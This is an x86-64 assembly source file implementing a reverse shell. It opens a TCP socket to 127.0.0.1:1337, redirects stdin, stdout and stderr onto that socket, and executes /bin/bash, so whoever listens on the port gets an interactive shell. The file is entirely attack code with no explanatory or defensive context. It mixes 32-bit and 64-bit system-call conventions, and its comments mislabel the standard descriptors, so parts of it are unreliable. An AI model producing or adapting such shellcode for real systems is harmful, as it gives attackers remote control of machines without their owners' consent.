section .text
global _start

_start:
_socket:
    mov rbx, 2 ; AF_INET
    mov rcx, 1 ; SOCK_STREAM
    mov rdx, 6 ; IPPROTO_TCP
    mov rax, 359; sys_socket
    int 0x80 ; syscall
    mov r13, rax ; save file descriptor

_connect:
    mov rax, `\0\0\0\0\0\0\0\0` ; padding
    push rax
    mov rax, 0x0100007f39050002 ; 127.0.0.1:1337 AF_INET
    push rax

    mov rax, 42 ; connect
    mov rdi, r13
    mov rsi, rsp
    mov rdx, 0x10
    syscall

    mov rax, 63 ; dup2
    mov rbx, r13
    mov rcx, 0 ; stdou
    int 0x80

    mov rax, 63 ; dup2
    mov rbx, r13
    mov rcx, 1 ; stdin
    int 0x80

    mov rax, 63 ; dup2
    mov rbx, r13
    mov rcx, 2 ; stderr
    int 0x80

    ; prepare execing bin/bash
    mov rax, `h\0\0\0\0\0\0\0`
    push rax
    mov rax, `/bin/bas`
    push rax

    mov rax, 59 ; execve
    mov rdi, rsp
    mov rsi, 0
    mov rdx, 0
    syscall

_exit:
    mov rax, 1
    mov rbx, 0
    int 0x80